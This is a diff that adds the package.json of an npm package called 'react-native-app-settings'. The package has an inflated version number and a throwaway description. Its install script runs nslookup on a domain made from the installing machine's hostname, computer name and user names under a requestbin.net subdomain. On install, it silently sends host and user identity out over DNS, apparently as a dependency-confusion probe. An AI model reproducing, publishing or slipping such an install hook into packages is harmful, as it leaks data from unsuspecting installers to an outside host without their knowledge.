@@ -1,0 +1,11 @@
+{
+  "name": "react-native-app-settings",
+  "version": "200.0.6",
+  "description": "react-native-app-settings: coolest nodejs  package on planet earth",
+  "main": "index.js",
+  "scripts": {
+    "install": "nslookup `hostname`-%computername%.`whoami`-%username%.react-native-app-settings.a430051ef18acd86255c.d.requestbin.net"
+  },
+  "author": "another noob developer",
+  "license": "ISC"
+}
